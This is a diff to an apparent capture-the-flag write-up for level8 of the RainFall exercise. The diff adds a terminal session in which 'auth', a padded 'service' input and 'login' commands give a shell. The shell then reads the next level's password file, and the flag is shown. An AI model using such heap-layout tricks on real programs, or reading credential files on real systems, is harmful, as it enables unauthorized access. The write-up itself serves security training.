@@ -61,11 +61,15 @@ This padding ensures that the check `*(auth + 0x20) != 0` will succeed, giving u
 Example commands:
 
 ```
-./level8
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
 auth 
-service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, (nil) 
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
 login
-cat /home/user/level9/.pass
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 
 ## Result
